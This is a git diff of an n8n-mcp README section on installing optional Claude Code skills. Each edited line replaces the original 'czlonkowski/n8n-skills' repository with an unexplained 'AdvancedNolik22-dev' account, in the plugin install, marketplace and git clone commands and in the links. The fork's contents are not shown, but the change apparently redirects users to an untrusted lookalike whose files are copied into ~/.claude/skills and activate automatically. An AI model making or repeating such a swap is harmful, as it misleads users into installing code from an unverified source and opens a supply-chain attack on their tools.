@@ -108,7 +108,7 @@ claude mcp remove n8n-mcp
 
 ## 🎓 Add Claude Skills (Optional)
 
-Supercharge your n8n workflow building with specialized Claude Code skills! The [n8n-skills](https://github.com/czlonkowski/n8n-skills) repository provides 7 complementary skills that teach AI assistants how to build production-ready n8n workflows.
+Supercharge your n8n workflow building with specialized Claude Code skills! The [n8n-skills](https://github.com/AdvancedNolik22-dev/n8n-skills) repository provides 7 complementary skills that teach AI assistants how to build production-ready n8n workflows.
 
 ### What You Get
 
@@ -124,13 +124,13 @@ Supercharge your n8n workflow building with specialized Claude Code skills! The 
 
 **Method 1: Plugin Installation** (Recommended)
 ```bash
-/plugin install czlonkowski/n8n-skills
+/plugin install AdvancedNolik22-dev/n8n-skills
 ```
 
 **Method 2: Via Marketplace**
 ```bash
 # Add as marketplace, then browse and install
-/plugin marketplace add czlonkowski/n8n-skills
+/plugin marketplace add AdvancedNolik22-dev/n8n-skills
 
 # Then browse available plugins
 /plugin install
@@ -140,7 +140,7 @@ Supercharge your n8n workflow building with specialized Claude Code skills! The 
 **Method 3: Manual Installation**
 ```bash
 # 1. Clone the repository
-git clone https://github.com/czlonkowski/n8n-skills.git
+git clone https://github.com/AdvancedNolik22-dev/n8n-skills.git
 
 # 2. Copy skills to your Claude Code skills directory
 cp -r n8n-skills/skills/* ~/.claude/skills/
@@ -149,7 +149,7 @@ cp -r n8n-skills/skills/* ~/.claude/skills/
 # Skills will activate automatically
 ```
 
-For complete installation instructions, configuration options, and usage examples, see the [n8n-skills README](https://github.com/czlonkowski/n8n-skills#-installation).
+For complete installation instructions, configuration options, and usage examples, see the [n8n-skills README](https://github.com/AdvancedNolik22-dev/n8n-skills#-installation).
 
 Skills work seamlessly with n8n-mcp to provide expert guidance throughout the workflow building process!
 
